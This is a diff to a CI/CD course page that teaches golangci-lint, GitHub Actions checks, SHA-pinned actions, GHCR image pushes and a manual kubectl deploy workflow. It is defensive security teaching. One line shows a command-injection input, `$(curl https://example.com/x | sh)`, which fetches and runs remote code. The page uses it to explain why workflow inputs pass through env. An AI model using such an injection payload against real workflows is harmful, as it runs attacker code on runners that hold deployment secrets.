@@ -1,17 +1,24 @@
 ---
 title: "Week 14: CI/CD"
+description: Lint the Go code with golangci-lint, run every check of make ci on each pull request with GitHub Actions, push the images to GHCR from main, and write the manual deploy workflow that Week 16 starts.
 week: 14
 phase: harden
-hours: [5, 8]
+hours: [6, 8]
 aiStage: 3
 tracks: [ci-cd, automation, git]
 done:
-  - id: item-1
-    text: "Placeholder item 1: this week is not written yet"
-  - id: item-2
-    text: "Placeholder item 2: this week is not written yet"
-  - id: item-3
-    text: "Placeholder item 3: this week is not written yet"
+  - id: lint-clean
+    text: make lint reports 0 issues on your code, and every exclusion in your .golangci.yml carries a comment that gives its reason.
+  - id: checks-required
+    text: A pull request in your repository shows the lint, test, web and e2e checks passing, and a rule on main refuses a merge until all four pass (or, in a private repository on GitHub Free, the four checks pass before you merge).
+  - id: red-build-read
+    text: You pushed a failing test on a branch, watched its pull request turn red, and found the failing line with gh run view --log-failed.
+  - id: images-in-ghcr
+    text: After a merge to main, GHCR holds the api, worker, scheduler, alerter and web images, each tagged with the full SHA of the merge commit.
+  - id: actions-pinned
+    text: Every uses line in your workflows names a full commit SHA with a version comment, you read each SHA from git ls-remote yourself, and actionlint reports nothing.
+  - id: deploy-explained
+    text: deploy.yml sits on main with only contents read, and you can explain why its input reaches the script through env and why it waits for Week 16.
 ---
 
 import WeekHeader from '../../../components/WeekHeader.astro';
@@ -21,43 +28,476 @@ import AiThisWeek from '../../../components/AiThisWeek.astro';
 import SideLab from '../../../components/SideLab.astro';
 import ReadWith from '../../../components/ReadWith.astro';
 import DoneWhen from '../../../components/DoneWhen.astro';
+import Diagram from '../../../components/Diagram.astro';
+import CodeFrom from '../../../components/CodeFrom.astro';
+import { weekHref, trackHref } from '../../../lib/links';
 
 <WeekHeader />
 
+At the end of <a href={weekHref(13)}>Week 13</a>, `make test` passes on your laptop, and every program logs, counts and traces its work. Nothing stops a commit that breaks the tests from reaching `main`, though: the checks run only when you remember to run them. This week, GitHub runs them for you. Every pull request gets the same checks as `make ci`, a merge to `main` builds the five images and stores them in a registry, and a deploy workflow waits for the cluster that <a href={weekHref(16)}>Week 16</a> builds.
+
 ## Goals
 
-This section is not written yet.
+- Explain continuous integration and continuous delivery, and the parts of GitHub Actions: workflow, event, job, step, runner and action.
+- Lint the Go code with golangci-lint, and fix or explain every finding.
+- Run vet, lint, the Go tests against Postgres 17, the web tests and Playwright on every pull request.
+- Push the images to the GitHub Container Registry from `main`, tagged with the commit SHA, from the one job that can write packages.
+- Pin every action to a full commit SHA, and say why a tag is not enough.
+- Write a manual deploy workflow that applies the Kubernetes manifests with `kubectl`.
 
 ## Concepts
 
-This section is not written yet.
+### CI and CD
+
+**Continuous integration** (CI) means two habits: everyone merges small changes into `main` at least once a day, and a machine runs the checks on every change before it merges. The machine is the point. It runs every check, every time, on a clean computer, and it shows the result on the pull request for every reviewer to see.
+
+**Continuous delivery** (CD) adds one step: every commit that passes the checks produces something you can deploy, here a container image for each program. **Continuous deployment** goes one step further and deploys each such commit automatically. This course does the first two automatically and keeps deployment a button you press, because a deploy to your one small server is an event you want to watch.
+
+### The Parts of GitHub Actions
+
+GitHub Actions is the CI service built into GitHub. Its vocabulary:
+
+- A **workflow** is a YAML file in `.github/workflows/`. GitHub reads every file there.
+- An **event** starts a workflow: `pull_request` when a pull request opens or gets a new commit, `push` when commits reach a branch, `workflow_dispatch` when you press **Run workflow**.
+- A **job** is a list of steps that runs on one runner. Jobs of one workflow run side by side, unless `needs:` makes one wait for others.
+- A **runner** is the machine that runs a job. A GitHub-hosted runner is a fresh virtual machine, created for the job and deleted after it. Nothing on its disk survives into the next job.
+- A **step** either runs a shell script, with `run:`, or calls an **action** with `uses:`: a packaged step that someone publishes in a Git repository, such as `actions/checkout`, which clones your repository onto the runner.
+- An **expression** such as `${{ github.sha }}` reads a value from a **context**: `github` describes the event and the commit, `secrets` holds secrets, `matrix` holds the current matrix values. GitHub replaces each expression with its value before the step starts.
+
+The whole pipeline for your monitor:
+
+<Diagram
+  id="pipeline"
+  title="From a pushed branch to images in GHCR, and later to the cluster"
+  code={`direction: down
+dev: your branch
+pr: pull request
+checks: ci.yml checks {
+  lint: lint
+  test: test
+  web: web
+  e2e: e2e
+}
+images: images job
+ghcr: GHCR
+deploy: deploy.yml
+cluster: "cluster\\n(Week 16)"
+
+dev -> pr: git push
+pr -> checks: every push
+checks -> images: push to main
+images -> ghcr: five images
+ghcr -> cluster: pull
+deploy -> cluster: kubectl apply
+`}
+  steps={[
+    { hl: ['dev', 'pr', 'dev->pr'], caption: 'You push a branch and open a pull request. Each later push to the branch starts the checks again.' },
+    { hl: ['pr', 'checks', 'checks.lint', 'checks.test', 'checks.web', 'checks.e2e', 'pr->checks'], caption: 'The pull_request event starts ci.yml. Four jobs run side by side, each on its own fresh runner: lint, the Go tests with Postgres, the web tests and build, and Playwright. A rule on main refuses the merge until all four pass.' },
+    { hl: ['checks', 'images', 'checks->images'], caption: 'The merge pushes a commit to main, which starts ci.yml again. This time, after the four checks pass, the images job runs too. On a pull request, its if: condition skips it.' },
+    { hl: ['images', 'ghcr', 'images->ghcr'], caption: 'The images job builds one image per Dockerfile target and pushes each to the GitHub Container Registry, tagged with the full commit SHA. The same SHA names the code and the image.' },
+    { hl: ['deploy', 'cluster', 'ghcr', 'deploy->cluster', 'ghcr->cluster'], caption: 'From Week 16, you start deploy.yml by hand with a commit SHA. It points the manifests at the images of that commit and applies them. The cluster pulls the images from GHCR.' },
+  ]}
+/>
+
+Pin the runner image too. `runs-on: ubuntu-latest` moves to a new Ubuntu release on the schedule GitHub sets, and a build that passed yesterday can fail on new system packages. `ubuntu-24.04` changes only when you change it.
+
+### Tokens, Permissions and Secrets
+
+Every job gets a **`GITHUB_TOKEN`**: a password for the GitHub API that GitHub creates when the job starts and revokes when it ends. The `permissions:` key sets what the token can do. As soon as a workflow names one permission, every permission it does not name is `none`. Your CI grants `contents: read` to every job, and adds `packages: write` to the images job alone. A test dependency that turns hostile finds a token that cannot push a commit, a tag or an image.
+
+**Secrets** are values you store in the repository settings, such as the kubeconfig for your cluster. A workflow reads them as `${{ secrets.NAME }}`, and GitHub masks their values in the logs. Two rules protect them from strangers. A pull request from a **fork**, a copy of your repository in another account, runs with a read-only token and without your secrets. A secret stored in an **environment**, a named target such as `production`, reaches only the jobs that declare that environment.
+
+<Diagram
+  id="permissions"
+  title="What each job can reach"
+  code={`direction: down
+token: GITHUB_TOKEN
+secret: KUBECONFIG secret
+fork: fork PR
+checks: "lint, test,\\nweb, e2e"
+images: images job
+deploy: deploy job
+ghcr: GHCR
+cluster: cluster
+
+token -> checks: read
+token -> images: "read,\\npackages write"
+fork -> checks: "read-only,\\nno secrets"
+images -> ghcr: push
+secret -> deploy: "production\\nonly"
+deploy -> cluster: kubectl
+`}
+  steps={[
+    { hl: ['token', 'checks', 'token->checks'], caption: 'The four check jobs run your code and thousands of npm and Go packages. Their token can read the repository and nothing else: it cannot push a commit, a tag or an image.' },
+    { hl: ['token', 'images', 'ghcr', 'token->images', 'images->ghcr'], caption: 'Only the images job can write packages, and it runs only for a push to main, after the checks pass. Its token can read the code and push packages, nothing else.' },
+    { hl: ['fork', 'checks', 'fork->checks'], caption: 'A pull request from a fork, a copy of your repository in another account, runs the checks with a read-only token and without your secrets, whatever its workflow file asks for.' },
+    { hl: ['secret', 'deploy', 'cluster', 'secret->deploy', 'deploy->cluster'], caption: 'The kubeconfig lives in the production environment. Only a job that names that environment receives it, and only the deploy job does.' },
+  ]}
+/>
+
+### Pin Actions to a Commit
+
+`uses: actions/checkout@v7` looks fixed, but `v7` is a Git **tag**, and the owner of a repository can move a tag to any commit. Whoever controls the action repository, or has stolen the credentials of someone who does, can point `v7` at new code, and your next run executes that code with your token and your secrets. In March 2025, an attacker did exactly that to the `tj-actions/changed-files` action: every tag pointed at a commit that printed the secrets of each run into its log. Workflows pinned to a commit SHA kept running the old code.
+
+A **commit SHA** is the 40-character hexadecimal hash that Git computes from the content of a commit. Change one byte, and the SHA changes. `uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1` therefore names one exact version of the action, forever. GitHub documents a full-length SHA as the only way to use an action as an immutable release. Two costs come with it:
+
+- You no longer receive fixes on your own. Dependabot, the GitHub bot that proposes dependency updates, opens a pull request for each new release and updates the SHA and the comment together.
+- A SHA tells a human nothing. The comment after it, `# v7.0.1`, names the release, and Dependabot reads it too.
+
+Read each SHA from the action repository yourself, and never copy one from a blog post or an AI answer. A SHA from a fork of the action also works in `uses:`, because GitHub serves the commits of a fork through the original repository. Only `git ls-remote` against the original repository proves that the commit is the release you mean.
+
+### Images Tagged with the Commit
+
+The images job tags each image with `${{ github.sha }}`, the full SHA of the commit that the workflow runs on. A tag such as `latest` moves with every build and says nothing about the code inside. A SHA tag answers three questions at once: which code an image holds, which image to deploy for a commit, and which image to roll back to. The **GitHub Container Registry**, GHCR at `ghcr.io`, stores the images next to your repository. The job logs in with its `GITHUB_TOKEN`, and GitHub links each package it pushes to the repository.
 
 ## Build
 
-This section is not written yet.
+You add six files and change a few lines of Week 13 code. The code comes from the site examples in `examples/go/week14/your-monitor`, which mirror your repository:
+
+```txt
+your-monitor/
+├── .golangci.yml             new: the linter settings
+├── .github/
+│   ├── dependabot.yml        new: keeps the action pins fresh
+│   └── workflows/
+│       ├── ci.yml            new: checks on every PR, images from main
+│       └── deploy.yml        new: manual deploy, used from Week 16
+├── Makefile                  new targets: lint and ci
+└── internal/obs/
+    ├── serve.go              new: header timeouts, pprof on loopback
+    └── serve_test.go         new: tests of both
+```
+
+### Step 1: Install the Linters
+
+**golangci-lint** runs many Go linters in one pass. A **linter** reads code without running it and reports mistakes that compile fine, such as an ignored error. **actionlint** checks workflow files, and runs ShellCheck, a linter for shell scripts, on every `run:` script when ShellCheck is installed.
+
+On macOS:
+
+```sh
+brew install golangci-lint actionlint shellcheck
+```
+
+On Linux, install golangci-lint with its official script, then actionlint with Go, then ShellCheck with `apt`:
+
+```sh
+curl -sSfL https://golangci-lint.run/install.sh | sh -s -- -b "$(go env GOPATH)/bin"
+go install github.com/rhysd/actionlint/cmd/actionlint@latest
+sudo apt install shellcheck
+```
+
+Print the version:
+
+```sh
+golangci-lint version
+```
+
+Note the version number, such as `2.14.0`: Step 5 writes it into the CI workflow. CI and your laptop must run the same release, because each release adds checks. A golangci-lint binary built with an older Go than the `go` line of your `go.mod` refuses to run at all: install the newest release. The examples pin `v2.14.0`, built with Go 1.27.0.
+
+### Step 2: Configure the Linters
+
+Create `.golangci.yml` at the root of your repository:
+
+<CodeFrom file="go/week14/your-monitor/.golangci.yml" region="golangci" lang="yaml" title=".golangci.yml" />
+
+`default: standard` turns on the five linters that golangci-lint runs when you configure nothing. The four in `enable:` catch mistakes this project can make: an unclosed response body in the probe, an `err ==` comparison that misses a wrapped error from the store, a server without timeouts. Every exclusion carries its reason in a comment. An exclusion without one turns into a mystery the first time someone asks why the linter stays quiet.
+
+Add two targets to the `Makefile`:
+
+<CodeFrom file="go/week14/your-monitor/Makefile" region="lint" lang="makefile" title="Makefile" />
+
+`make ci` runs every check that the CI workflow runs: run it before you push, and a red pull request becomes rare.
+
+### Step 3: Fix What the Linter Finds
+
+Run it:
+
+```sh
+make lint
+```
+
+On the Week 13 code of the site examples, the first run reports nine findings. The output below keeps the first line of each. Your code differs from the examples, which gives your run other lines and numbers, but the same kinds of finding:
+
+```txt
+cmd/api/main.go:107:16: Error return value is not checked (errcheck)
+cmd/worker/main.go:80:16: Error return value is not checked (errcheck)
+internal/alert/notify.go:82:9: Error return value of `io.Copy` is not checked (errcheck)
+internal/db/migrate.go:41:17: Error return value of `conn.Exec` is not checked (errcheck)
+cmd/api/main.go:155:46: G114: Use of net/http serve function that has no support for setting timeouts (gosec)
+cmd/scheduler/main.go:52:48: G114: Use of net/http serve function that has no support for setting timeouts (gosec)
+cmd/worker/main.go:20:2: G108: Profiling endpoint is automatically exposed on /debug/pprof (gosec)
+cmd/worker/main.go:86:46: G114: Use of net/http serve function that has no support for setting timeouts (gosec)
+cmd/worker/main.go:122:22: G115: integer overflow conversion int -> int32 (gosec)
+9 issues:
+* errcheck: 4
+* gosec: 5
+```
+
+Read each finding and decide: fix it, or exclude it with a reason. Never exclude a finding you do not understand.
+
+**G114, a server without timeouts.** `http.ListenAndServe` starts a server with no time limits. A client that sends one byte of its request headers per minute holds a connection and a goroutine for as long as it likes. Opening many such connections to exhaust a server is an attack called Slowloris. Give the metrics and debug servers a header timeout. Create `internal/obs/serve.go`:
+
+<CodeFrom file="go/week14/your-monitor/internal/obs/serve.go" region="serve" lang="go" title="internal/obs/serve.go" />
+
+Then replace each `http.ListenAndServe(addr, mux)` with `obs.NewServer(addr, mux).ListenAndServe()`, in the api, the scheduler and the worker. A test proves the timeout works. It sends half a request and checks that the server hangs up:
+
+<CodeFrom file="go/week14/your-monitor/internal/obs/serve_test.go" region="serve-test" lang="go" title="internal/obs/serve_test.go" />
+
+**errcheck, an ignored error.** Four calls drop an error:
+
+- `defer shutdown(context.Background())` in the api and the worker: a failed shutdown loses the last spans. Wrap it in a function that logs the error, as the worker setup under G108 shows.
+- `io.Copy(io.Discard, ...)` in the webhook notifier: a failed read changes nothing. Write `_, _ = io.Copy(...)`, which tells the next reader of the code that you ignore the error on purpose.
+- `defer conn.Exec(..., pg_advisory_unlock ...)` in `Migrate`: when the unlock fails, the pool gets back a connection that still holds the migration lock, and the `Migrate` of every other program waits until the pool drops that connection, up to an hour later. Close the connection instead, which releases the lock:
+
+<CodeFrom file="go/week14/your-monitor/internal/db/migrate.go" region="unlock" lang="go" title="internal/db/migrate.go" />
+
+**G115, an integer that wraps.** `int32(workers)` turns a number above 2,147,483,647 into a negative one. Check the range before the conversion and return an error outside it:
+
+<CodeFrom file="go/week14/your-monitor/cmd/worker/main.go" region="connect" lang="go" title="cmd/worker/main.go" />
+
+**G108, pprof on a public port.** The blank import `_ "net/http/pprof"` adds the profiling pages to `http.DefaultServeMux`, the mux that the worker serves on `-debug-addr`. In `compose.yaml`, that address is `:6060`, every network interface of the container, because Prometheus scrapes `/metrics` there from its own container. Anyone who reaches the port reads your heap, your goroutines and your command line, and `/debug/pprof/profile` keeps a CPU busy for 30 seconds per request. A `//nolint` comment here hides a real exposure. Split the two servers instead: `/metrics` keeps `-debug-addr` on a mux of its own, and pprof moves to a new `-pprof-addr` command-line flag that refuses any address but a loopback one. Add to `internal/obs/serve.go`:
+
+<CodeFrom file="go/week14/your-monitor/internal/obs/serve.go" region="pprof" lang="go" title="internal/obs/serve.go" />
+
+Delete the blank import. gosec reports only a blank import of `net/http/pprof`, the form that exposes the pages without a line of code that names them. The worker setup after the three fixes:
+
+<CodeFrom file="go/week14/your-monitor/cmd/worker/main.go" region="setup" lang="go" title="cmd/worker/main.go" />
+
+Add `-pprof-addr 127.0.0.1:6061` to `ARGS` in the `Makefile`, and use `http://127.0.0.1:6061/debug/pprof/` wherever <a href={weekHref(5)}>Week 5</a> used port 6060. Two tests in `serve_test.go` check that the server refuses `:6061` and `0.0.0.0:6061`, and that the pages answer.
+
+Run `make lint` again until it prints `0 issues.`, then run `make test`.
+
+### Step 4: Start the CI Workflow
+
+Create `.github/workflows/ci.yml`. The top sets the name, the events, the default permissions and the concurrency group:
+
+<CodeFrom file="go/week14/your-monitor/.github/workflows/ci.yml" region="head" lang="yaml" title=".github/workflows/ci.yml" />
+
+A **concurrency group** holds at most one running and one pending run. A new run cancels the pending one, and with `cancel-in-progress: true` it cancels the running one too. A pull request gets one group, its `github.ref`: when you push twice in a minute, GitHub cancels the run of the first push, which no one reads anyway. A shared group on `main` loses commits. Merge three pull requests in a row, and the third run cancels the pending second one, whose images then never exist. The expression `a && b || c` returns `b` when `a` is true and `c` otherwise. Each push to `main` therefore gets its run ID, a group no other run shares.
+
+### Step 5: Lint and Test
+
+The first two jobs. Every job sits under `jobs:`, indented by two spaces, in the order the snippets show:
+
+<CodeFrom file="go/week14/your-monitor/.github/workflows/ci.yml" region="lint" lang="yaml" title=".github/workflows/ci.yml" />
+
+`actions/setup-go` installs the Go version that `go.mod` names, in the `toolchain` line, or else the `go` line, and caches the downloaded modules between runs. `persist-credentials: false` keeps the token out of the checked-out repository: no step here pushes with Git. Set `version:` to the golangci-lint release you noted in Step 1.
+
+<CodeFrom file="go/week14/your-monitor/.github/workflows/ci.yml" region="test" lang="yaml" title=".github/workflows/ci.yml" />
+
+`services:` starts a **service container** next to the job: the `postgres:17` image, with a `pg_isready` health check, as in `compose.yaml`. The job runs on the runner itself, which reaches the container through the published port at `localhost:5432`. GitHub waits for the health check to pass before the first step. GitHub also sets `CI=true` on every runner, which is why the Postgres tests from <a href={weekHref(8)}>Week 8</a> fail instead of skipping when `DATABASE_URL` is missing.
+
+### Step 6: Web Tests and Playwright
+
+<CodeFrom file="go/week14/your-monitor/.github/workflows/ci.yml" region="web" lang="yaml" title=".github/workflows/ci.yml" />
+
+`defaults.run.working-directory` runs every `run:` step of the job in `web/`. `npm ci` installs exactly what `package-lock.json` lists, and fails if the lock file and `package.json` disagree. `npm run build` type-checks the code: Vitest runs your tests without checking types.
+
+<CodeFrom file="go/week14/your-monitor/.github/workflows/ci.yml" region="e2e" lang="yaml" title=".github/workflows/ci.yml" />
+
+`npx playwright install --with-deps chromium` downloads Chromium and the Linux libraries it needs. The Playwright config from <a href={weekHref(10)}>Week 10</a> already reads `CI`: it starts its own Vite server and fails on a `test.only` left in the code. `if: failure()` runs the upload only when an earlier step fails, and keeps the traces of the failed tests for seven days.
+
+### Step 7: Read Every SHA Yourself
+
+Each `uses:` line in the examples names a commit SHA and a release. Before you copy a line, check its SHA against the action repository. `git ls-remote --tags` lists tags and the commits they point at, straight from GitHub:
+
+```txt
+$ git ls-remote --tags https://github.com/actions/checkout v7.0.1
+3d3c42e5aac5ba805825da76410c181273ba90b1	refs/tags/v7.0.1
+```
+
+Some projects use annotated tags: a tag that is an object of its own, with a message and a date. For those, the plain line shows the SHA of the tag object, and a second line ending in `^{}` shows the commit. Pin the commit:
+
+```txt
+$ git ls-remote --tags https://github.com/azure/setup-kubectl v5 'v5^{}'
+e30ae091d7932a5f6919803061a96da1e82915eb	refs/tags/v5
+bda439f5f36b99b262ebdcd3613869bddb064c8e	refs/tags/v5^{}
+```
+
+To pin a newer release than the examples, list the tags with `git ls-remote --tags https://github.com/<owner>/<repo>`, pick the newest `vX.Y.Z`, and copy its commit. The examples pin the newest release that is at least two weeks old. The wait gives the maintainers and the security community time to find and pull a hijacked release before it reaches your runners.
+
+Create `.github/dependabot.yml` to receive a pull request for each new release:
+
+<CodeFrom file="go/week14/your-monitor/.github/dependabot.yml" region="dependabot" lang="yaml" title=".github/dependabot.yml" />
+
+### Step 8: Push the Images
+
+<CodeFrom file="go/week14/your-monitor/.github/workflows/ci.yml" region="images" lang="yaml" title=".github/workflows/ci.yml" />
+
+Read it from the top:
+
+- `needs` and `if`: the job waits for the four checks and runs only for a push to `main`. On a pull request, it shows as skipped.
+- `strategy.matrix`: GitHub starts five copies of the job, one for each value of `target`, which match the stages of your Dockerfile.
+- **Name the image**: `${GITHUB_REPOSITORY,,}` is bash for the lowercase form of `owner/your-monitor`. A registry refuses an image name with capitals, and a GitHub user name such as `Ada-Lovelace` has them. The value goes to `$GITHUB_ENV`, a file whose lines become environment variables for the later steps.
+- `docker/login-action` logs in to `ghcr.io` with the job token. `docker/setup-buildx-action` starts BuildKit, the Docker build engine that the cache needs.
+- `docker/build-push-action` builds one target and pushes it. `cache-from` and `cache-to` keep the layers in the GitHub Actions cache, one scope per target. A layer whose inputs have not changed, such as the downloaded Go modules, comes from the cache instead of a new build.
+- **Summary** writes the image name and its digest, the SHA-256 hash of the image content, to the run summary page.
+
+### Step 9: Write the Deploy Workflow
+
+The deploy workflow runs only when you start it, and it stays unused until Week 16 builds the cluster. It assumes three things that Weeks 15 and 16 set up: the manifests name each image as Compose builds it, such as `your-monitor-api`; a `deploy/k8s/overlays/prod` overlay; and a `KUBECONFIG` secret whose context points at the namespace of the app.
+
+<CodeFrom file="go/week14/your-monitor/.github/workflows/deploy.yml" region="deploy-head" lang="yaml" title=".github/workflows/deploy.yml" />
+
+GitHub shows **Run workflow** only for a workflow file on the default branch, `main`. The `sha` input picks the images to deploy. Leave it empty to deploy the commit you start the run from, and start the run only after the images job of that commit turns green: the deploy does not wait for it. An older SHA rolls back the images only. The manifests always come from the commit the run starts from, the head of `main`. On GitHub Free, environments exist only in public repositories. In a private one, store `KUBECONFIG` as a repository secret and delete the `environment:` line.
+
+<CodeFrom file="go/week14/your-monitor/.github/workflows/deploy.yml" region="deploy-job" lang="yaml" title=".github/workflows/deploy.yml" />
+
+The input is the dangerous part. GitHub pastes every `${{ }}` expression into the script text before bash reads it. Written as `run: echo ${{ inputs.sha }}`, an input of `$(curl https://example.com/x | sh)` runs as code on a runner that holds your kubeconfig. Through `env:`, the input stays a value in the variable `SHA`, and the regular expression accepts nothing but 40 lowercase hexadecimal characters. The step then writes a small **Kustomization**, the Kustomize file that lists manifests and changes to them, which reuses the prod overlay and swaps each image for its GHCR name and the SHA tag. Week 15 covers Kustomize.
+
+The last step applies the result. `kubectl apply -k` puts every object in the `your-monitor` namespace, which the base of Week 15 names. `kubectl rollout status` waits until each Deployment in that namespace runs the new version, and fails the job after five minutes if one does not. `--namespace` keeps the job independent of the namespace that the kubeconfig picks. `setup-kubectl` installs kubectl v1.36.5, the newest patch of Kubernetes 1.36, the version of the cluster in Weeks 15 to 18. The job turns red when a deploy fails, not only when `kubectl apply` fails.
+
+### Step 10: Check the Workflows
+
+Run actionlint from the root of your repository. It finds the workflows on its own, and prints nothing when they pass:
+
+```sh
+actionlint
+```
+
+actionlint checks the expressions, the `needs:` names, the event names and every `run:` script. It does not check the `with:` inputs of an action pinned to a SHA, because its table of known inputs uses tags: a typo such as `persist-credential` passes. Compare each `with:` key with the `action.yml` of that release. The site examples run a test that does it.
+
+### Step 11: Open the Pull Request
+
+Commit the six new files and the fixes on a branch, push it, and open a pull request:
+
+```sh
+git switch -c week-14
+git add .golangci.yml .github Makefile internal cmd
+git commit -m "CI: lint, tests, images and deploy workflows"
+git push -u origin week-14
+gh pr create --fill
+gh pr checks --watch
+```
+
+`gh pr checks --watch` refreshes the list of checks until all of them finish. The pull request page shows the same list under **Checks**. The first run fills the caches and takes the longest.
+
+Make the checks required. On GitHub, open **Settings**, then **Rules** and **Rulesets** in the sidebar, and click **New ruleset**, **New branch ruleset**. Name it `main`, set the enforcement status to **Active**, add the default branch as the target, select **Require status checks to pass before merging**, and add `lint`, `test`, `web` and `e2e`. Click **Create**. The check names exist once they have run, which is why the pull request comes first. On GitHub Free, rulesets work only in a public repository. In a private one, merge only on green by habit, or move to GitHub Pro.
+
+Merge the pull request. The push to `main` starts `ci.yml` again, and this time the five `images` jobs run. Find the packages under **Packages** on your profile page, or on the right side of your repository page. Each one shows the SHA tag and links to your repository.
+
+### Step 12: Break It on Purpose
+
+On a new branch, change an expected value in one Go test, push, and open a pull request. The `test` job turns red. Read the failure from your terminal:
+
+```sh
+gh run list --workflow ci.yml --limit 3
+gh run view <run-id> --log-failed
+```
+
+`--log-failed` prints only the steps that failed, with the `FAIL` line and the file and line number of the failing check. Fix the test, push again, and watch the run turn green. Close the pull request without merging.
 
 ## Observe It
 
 <ObserveIt>
-This section is not written yet.
+
+Your pipeline is a system of its own, and it deserves the same habits as the monitor.
+
+**Measure how long a run takes.** A slow pipeline costs focus: when CI takes 20 minutes, you switch to other work and meet the red result an hour later. List the last runs on `main` with their start and end times:
+
+```sh
+gh run list --workflow ci.yml --branch main --limit 10 --json databaseId,conclusion,startedAt,updatedAt
+```
+
+`gh run view <run-id>` lists each job with its duration. Keep a pull request run under 10 minutes. When it grows past that, the slowest job tells you where to cut. In the examples, the `internal/auth` tests take the longest of the Go packages, because bcrypt is slow on purpose.
+
+**Watch the caches.** In the log of the `setup-go` and `setup-node` steps, a cache hit prints a line that names the restored cache key. A run without a hit downloads every module again. The Docker cache shows up in the build log as `CACHED` next to each layer it reuses.
+
+**Count flaky tests.** A **flaky** test passes and fails on the same code. When a job fails, rerun only the failed jobs with `gh run rerun <run-id> --failed`. If it passes, you found a flaky test: write down its name and fix it this week. A rerun that hides flakes trains everyone to ignore red.
+
+**Read the summary.** The run summary page of every push to `main` lists the five images with their digests. That list answers which image runs which code, which Week 17 needs for its rollbacks.
+
 </ObserveIt>
 
 ## Operate It
 
 <OperateIt>
-This section is not written yet.
+
+Here is how the common failures look, and what each one points to.
+
+**The lint job fails, and `make lint` passes on your laptop.** CI and your laptop run different golangci-lint releases: each release adds checks. Compare `golangci-lint version` with `version:` in `ci.yml`, and make them match. When the binary is older than your Go, the job fails before it lints anything:
+
+```txt
+Error: can't load config: the Go language version (go1.25) used to build golangci-lint is lower than the targeted Go version (1.27.0)
+```
+
+Install a golangci-lint release built with your Go version or newer, and raise `version:` to match.
+
+**The Go tests fail with `DATABASE_URL is not set; CI must provide a Postgres database`.** The `env:` block of the `test` job is missing or misspelled. The Week 8 helper fails on purpose when `CI=true`, rather than skipping every Postgres test and reporting green.
+
+**The Go tests fail with `connection refused` on port `5432`.** The service container is not ready, or not published. Check `ports:` and the health options: without `--health-cmd`, GitHub starts the steps as soon as the container starts, before Postgres accepts connections.
+
+**Playwright fails with `Executable doesn't exist at`.** The `npx playwright install` step is missing or runs in the wrong folder: the browsers must match the `@playwright/test` version in `web/package-lock.json`.
+
+**The images job fails at the push with a `denied` error from `ghcr.io`.** The job token lacks `packages: write`, or a package with the same name already exists in your account and is linked to another repository. Check the `permissions:` of the job first, then the package settings on GitHub.
+
+**The build fails with `repository name must be lowercase`.** An image name holds a capital letter: the name step is missing, or a tag uses `github.repository` directly.
+
+**The deploy fails with `sha must be a full 40-character commit SHA`.** The input holds a short SHA or a branch name. `git rev-parse <short-sha>` prints the full one.
+
+| What you see | What it points to |
+| --- | --- |
+| Lint fails in CI, passes locally | Different golangci-lint releases, or one built with an older Go |
+| `DATABASE_URL is not set` | The `env:` of the test job is missing |
+| `connection refused` on `5432` | The service has no published port or no health check |
+| `Executable doesn't exist at` | Playwright browsers not installed in the job |
+| `denied` from `ghcr.io` | No `packages: write`, or the package belongs to another repository |
+| `repository name must be lowercase` | The image name skips the lowercase step |
+
 </OperateIt>
 
 ## AI This Week
 
 <AiThisWeek>
-This section is not written yet.
+
+Stage 3, pair partner: use the assistant for scaffolding, configuration and review, and keep the decisions.
+
+**Do:** paste your finished `ci.yml` and ask it to review the workflow for permissions wider than each job needs, `${{ }}` expressions inside `run:` scripts, and steps that run on pull requests from forks with more access than they need. Check each point it raises against actionlint and the GitHub documentation before you change a line.
+
+**Do not:** take a commit SHA from it. A model writes 40 hexadecimal characters that look right and point at nothing, or at a commit in a fork. Read every SHA from `git ls-remote` yourself, as in Step 7. Do not let it decide who can start a deploy either: that is your call, made in the environment settings.
+
 </AiThisWeek>
 
 ## Side Lab
 
-<SideLab title="Optional lab: not written yet">
-This section is not written yet.
+<SideLab title="Stop a broken push before CI sees it, with a Git pre-push hook">
+
+A **Git hook** is a script that Git runs at a fixed point, such as before a commit or before a push. Hooks live in `.git/hooks/`, outside version control: each clone sets up its own. A hook that exits with a non-zero status cancels the operation.
+
+**1. Write the hook.** In your repository, create `.git/hooks/pre-push`:
+
+```sh
+#!/bin/sh
+# Runs before every git push. A non-zero exit cancels the push.
+exec make lint
+```
+
+Make it executable:
+
+```sh
+chmod +x .git/hooks/pre-push
+```
+
+**2. Watch it stop a push.** On a new branch, such as `hook-test`, add a line that drops an error, such as `f.Write(b)` without checking what it returns, commit it and push. This run comes from a small test repository with your `.golangci.yml` and one such line:
+
+```txt
+$ git push -u origin hook-test
+golangci-lint run
+main.go:11:9: Error return value of `f.Write` is not checked (errcheck)
+	f.Write([]byte("hello\n"))
+	       ^
+1 issues:
+* errcheck: 1
+make: *** [Makefile:2: lint] Error 1
+error: failed to push some refs to '../remote.git'
+```
+
+Nothing reached the remote. Fix the line, and the push goes through.
+
+**3. Compare the two gates.** `git push --no-verify` skips the hook. That is the difference between the two: a hook is a convenience on your laptop that anyone can skip or never install, while the required checks on GitHub apply to every merge. Use the hook to save yourself a red pull request, and the ruleset to protect `main`.
+
+Write down how long `make lint` takes. A hook that holds every push for 30 seconds trains you to type `--no-verify`. When yours takes that long, keep the fast checks in the hook and leave the slow ones to CI.
+
 </SideLab>
 
 ## Done When
